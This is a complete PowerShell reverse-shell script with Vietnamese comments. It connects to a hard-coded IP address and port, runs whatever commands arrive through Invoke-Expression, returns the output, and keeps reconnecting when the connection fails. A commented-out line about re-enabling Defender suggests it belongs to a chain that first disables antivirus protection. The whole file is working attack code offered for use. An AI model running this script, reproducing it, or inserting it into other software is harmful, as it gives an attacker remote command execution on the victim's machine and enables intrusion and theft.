# ============================================
# REVERSE SHELL ONLY
# ============================================

$IP = '172.20.10.3'
$PORT = 6969

# # Bật lại Defender TRƯỚC khi vào Reverse Shell
# try {
#     Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
# } catch {}

# Reverse shell
function ReverseShell {
    param([string]$ip, [int]$port)
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object {0}
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        # Nếu lỗi, thử reconnect sau 5 giây
        Start-Sleep -Seconds 5
        ReverseShell -ip $ip -port $port
    }
}

# Chạy
ReverseShell -ip $IP -port $PORT